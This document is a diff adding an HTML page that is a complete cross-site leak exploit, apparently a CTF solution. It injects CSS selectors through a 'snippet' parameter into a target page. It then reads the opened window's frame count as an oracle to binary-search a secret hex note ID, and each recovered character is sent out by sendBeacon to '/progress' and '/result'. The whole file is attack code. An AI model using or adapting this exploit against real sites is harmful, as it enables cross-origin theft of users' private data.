@@ -1,0 +1,39 @@
+<body><script type="module">
+const BASE  = 'http://phcode.158.158.76.135.nip.io';
+const CHARS = [...'0123456789abcdef'];
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+let known = 'NOTE_';
+const win = open('');
+
+const probe = async (chars) => {
+  win.location = 'about:blank';
+  while (true) { try { if (win.origin && win.length === 0) break; } catch {} await sleep(4); }
+
+  const rule = chars
+    .map(c => `embed[name^=${known}${c}]`)
+    .join(',') + '{display:none}';
+  const link = `<link href="/not-found.txt?{}${rule}" rel=stylesheet>`;
+  const payload = link + `<embed code=x type=text/html name=`;
+
+  const url = `${BASE}/?snippet=${encodeURIComponent(payload)}&debug[]=1`;
+  win.location = url;
+  while (true) { try { win.origin; await sleep(3); } catch { break; } }
+  for (let t = 0; t < 300; t += 8) {
+    if (win.length === 1) return false;
+    await sleep(8);
+  }
+  return true;
+};
+
+for (let i = 0; i < 16; i++) {
+  let lo = 0, hi = CHARS.length;
+  while (hi - lo > 1) {
+    const mid = (lo + hi) >> 1;
+    if (await probe(CHARS.slice(lo, mid))) hi = mid; else lo = mid;
+  }
+  known += CHARS[hi - 1];
+  navigator.sendBeacon('/progress', known);
+}
+navigator.sendBeacon('/result', known);
+</script></body>
